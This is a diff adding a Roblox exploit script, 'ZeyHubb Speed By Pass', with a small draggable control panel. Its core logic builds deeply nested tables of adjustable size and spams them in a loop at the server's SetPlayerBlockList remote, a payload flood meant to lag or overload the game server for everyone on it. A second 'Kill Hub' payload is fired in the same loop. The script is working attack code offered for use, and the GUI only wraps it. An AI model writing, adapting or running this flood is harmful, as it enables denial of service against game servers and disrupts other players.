@@ -1,0 +1,250 @@
+-- ZeyHubb Speed By Pass
+
+local Players         = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local RunService      = game:GetService("RunService")
+local TweenService    = game:GetService("TweenService")
+local LocalPlayer     = Players.LocalPlayer or Players.PlayerAdded:Wait()
+
+-- ============================================================
+-- CORE LOGIC
+-- ============================================================
+local DEPTH      = 296
+local SPAM_DELAY = 0.12
+local POWER      = 105000
+local running    = false
+local bomb       = nil
+local spamThread = nil
+
+local function buildBomb(power)
+    local maintable    = {}
+    local spammedtable = {}
+    table.insert(spammedtable, {})
+    local z = spammedtable[1]
+    for i = 1, DEPTH do
+        local t = {}
+        table.insert(z, t)
+        z = t
+    end
+    local maxRep = math.floor(power / (DEPTH + 2))
+    for i = 1, maxRep do
+        table.insert(maintable, spammedtable)
+    end
+    return maintable
+end
+
+local function stopBypass()
+    running = false
+    if spamThread then task.cancel(spamThread) end
+    bomb = nil; spamThread = nil
+end
+
+local function startBypass(power)
+    stopBypass()
+    running = true
+    bomb = buildBomb(power)
+    spamThread = task.spawn(function()
+        while running do
+            if bomb then
+                pcall(function()
+                    game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(bomb)
+                end)
+            end
+            -- Kill Hub low mode runs at same time
+            pcall(function()
+                local main, spam = {}, {{}}
+                local z = spam[1]
+                for i = 1, 25 do local t = {} table.insert(z, t); z = t end
+                local max = math.min(12000, 23 * 50)
+                for i = 1, max do table.insert(main, spam) end
+                game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main)
+            end)
+            task.wait(SPAM_DELAY)
+        end
+    end)
+end
+
+-- ============================================================
+-- GUI
+-- ============================================================
+local GREEN      = Color3.fromRGB(235, 235, 235)
+local GREEN_DARK = Color3.fromRGB(70, 70, 70)
+local GREEN_DIM  = Color3.fromRGB(120, 120, 120)
+local BG         = Color3.fromRGB(10, 10, 10)
+local BG2        = Color3.fromRGB(35, 35, 35)
+local BG3        = Color3.fromRGB(55, 55, 55)
+local GRAY       = Color3.fromRGB(180, 180, 180)
+local WHITE      = Color3.fromRGB(255, 255, 255)
+
+local function getParent()
+    if typeof(gethui) == "function" then
+        local ok, r = pcall(gethui); if ok and r then return r end
+    end
+    local ok, cg = pcall(function() return game:GetService("CoreGui") end)
+    if ok and cg then return cg end
+    return LocalPlayer:WaitForChild("PlayerGui")
+end
+
+local function new(cls, props, parent)
+    local obj = Instance.new(cls)
+    for k, v in pairs(props or {}) do obj[k] = v end
+    obj.Parent = parent
+    return obj
+end
+local function corner(obj, r) return new("UICorner", {CornerRadius = UDim.new(0, r)}, obj) end
+local function stroke(obj, col, th) return new("UIStroke", {Color=col, Thickness=th or 1, ApplyStrokeMode=Enum.ApplyStrokeMode.Border}, obj) end
+local function tw(obj, props, t) TweenService:Create(obj, TweenInfo.new(t or 0.15, Enum.EasingStyle.Quad), props):Play() end
+
+local parent = getParent()
+local old = parent:FindFirstChild("ZeyHubbPingLagger")
+if old then old:Destroy() end
+
+local gui = new("ScreenGui", {
+    Name="ZeyHubbSpeedByPass", ResetOnSpawn=false,
+    IgnoreGuiInset=true, ZIndexBehavior=Enum.ZIndexBehavior.Sibling,
+}, nil)
+pcall(function() gui.Parent = parent end)
+if not gui.Parent then gui.Parent = LocalPlayer:WaitForChild("PlayerGui") end
+
+-- Main frame
+local W, H = 220, 180
+local main = new("Frame", {
+    Name="Main", Size=UDim2.fromOffset(W, H),
+    Position=UDim2.new(0.5, -W/2, 0.5, -H/2),
+    BackgroundColor3=BG, BorderSizePixel=0,
+    ClipsDescendants=true, Active=true,
+}, gui)
+corner(main, 14)
+local mainStroke = stroke(main, GREEN_DIM, 1.5)
+
+-- Pulsing stroke
+task.spawn(function()
+    local t = 0
+    while mainStroke and mainStroke.Parent do
+        t = t + 0.05
+        mainStroke.Transparency = 0.2 + math.abs(math.sin(t * 2)) * 0.4
+        task.wait(0.04)
+    end
+end)
+
+-- Header
+local header = new("Frame", {
+    Size=UDim2.new(1,0,0,36), BackgroundColor3=BG2, BorderSizePixel=0, ZIndex=2,
+}, main)
+corner(header, 14)
+new("Frame", {Size=UDim2.new(1,0,0.5,0), Position=UDim2.new(0,0,0.5,0), BackgroundColor3=BG2, BorderSizePixel=0, ZIndex=2}, header)
+
+new("TextLabel", {
+    Size=UDim2.new(1,-14,1,0), Position=UDim2.fromOffset(12,0),
+    BackgroundTransparency=1, Text="ZeyHubb Speed By Pass",
+    TextColor3=GREEN, Font=Enum.Font.GothamBold, TextSize=12,
+    TextXAlignment=Enum.TextXAlignment.Left, ZIndex=3,
+}, header)
+
+-- Divider
+new("Frame", {
+    Size=UDim2.new(1,-24,0,1), Position=UDim2.new(0,12,0,36),
+    BackgroundColor3=GREEN_DIM, BorderSizePixel=0,
+}, main)
+
+-- Status
+local statusLbl = new("TextLabel", {
+    Size=UDim2.new(1,0,0,18), Position=UDim2.fromOffset(0,50),
+    BackgroundTransparency=1, Text="OFFLINE",
+    TextColor3=GRAY, Font=Enum.Font.GothamBold, TextSize=11, ZIndex=3,
+}, main)
+
+
+
+
+
+-- KB row
+-- no keybind row for Speed Bypass
+
+-- Power input row
+local pwRow = new("Frame", {
+    Size=UDim2.new(1,-24,0,28), Position=UDim2.fromOffset(12,88),
+    BackgroundColor3=BG3, BorderSizePixel=0, ZIndex=3,
+}, main)
+corner(pwRow, 7); stroke(pwRow, GREEN_DIM, 1)
+
+new("TextLabel", {
+    Size=UDim2.fromOffset(48,28), Position=UDim2.fromOffset(10,0),
+    BackgroundTransparency=1, Text="Power", TextColor3=GRAY,
+    Font=Enum.Font.GothamBold, TextSize=10,
+    TextXAlignment=Enum.TextXAlignment.Left, ZIndex=4,
+}, pwRow)
+
+local powerVal = 105000
+local powerBox = new("TextBox", {
+    Size=UDim2.new(1,-66,0,20), Position=UDim2.fromOffset(58,4),
+    BackgroundColor3=BG, BorderSizePixel=0,
+    ClearTextOnFocus=false, Text=tostring(powerVal),
+    TextColor3=GREEN, Font=Enum.Font.GothamBold, TextSize=10, ZIndex=4,
+}, pwRow)
+corner(powerBox, 5); stroke(powerBox, GREEN_DIM, 1)
+powerBox.FocusLost:Connect(function()
+    local n = tonumber(powerBox.Text)
+    if n and n > 0 then powerVal = math.floor(n)
+    else powerBox.Text = tostring(powerVal) end
+end)
+
+-- Activate button (centered)
+local active    = false
+
+local activateBtn = new("TextButton", {
+    Size=UDim2.new(1,-24,0,44), Position=UDim2.fromOffset(12,128),
+    BackgroundColor3=BG3, BorderSizePixel=0,
+    Text="ACTIVATE", TextColor3=GREEN,
+    Font=Enum.Font.GothamBold, TextSize=13, ZIndex=3,
+    AutoButtonColor=false,
+}, main)
+corner(activateBtn, 10)
+local activateStroke = stroke(activateBtn, GREEN_DIM, 1)
+
+local function setActive(state)
+    active = state
+    if state then
+        tw(activateBtn, {BackgroundColor3=GREEN_DARK})
+        activateStroke.Color = GREEN
+        activateBtn.Text = "DEACTIVATE"
+        activateBtn.TextColor3 = Color3.fromRGB(0,0,0)
+        statusLbl.Text = "ONLINE"; statusLbl.TextColor3 = GREEN
+        startBypass(powerVal)
+    else
+        tw(activateBtn, {BackgroundColor3=BG3})
+        activateStroke.Color = GREEN_DIM
+        activateBtn.Text = "ACTIVATE"
+        activateBtn.TextColor3 = GREEN
+        statusLbl.Text = "OFFLINE"; statusLbl.TextColor3 = GRAY
+        stopBypass()
+    end
+end
+
+activateBtn.Activated:Connect(function() setActive(not active) end)
+activateBtn.MouseEnter:Connect(function()
+    tw(activateBtn, {BackgroundColor3 = active and Color3.fromRGB(50,120,20) or Color3.fromRGB(25,25,25)})
+end)
+activateBtn.MouseLeave:Connect(function()
+    tw(activateBtn, {BackgroundColor3 = active and GREEN_DARK or BG3})
+end)
+
+-- Drag
+local dragging, dragStart, startPos = false, nil, nil
+main.InputBegan:Connect(function(i)
+    if i.UserInputType == Enum.UserInputType.MouseButton1
+    or i.UserInputType == Enum.UserInputType.Touch then
+        dragging=true; dragStart=i.Position; startPos=main.Position
+        i.Changed:Connect(function() if i.UserInputState==Enum.UserInputState.End then dragging=false end end)
+    end
+end)
+UserInputService.InputChanged:Connect(function(i)
+    if dragging and (i.UserInputType==Enum.UserInputType.MouseMovement
+    or i.UserInputType==Enum.UserInputType.Touch) then
+        local d = i.Position - dragStart
+        main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset+d.X, startPos.Y.Scale, startPos.Y.Offset+d.Y)
+    end
+end)
+
+setActive(false)
+print("ZeyHubb Speed By Pass loaded")
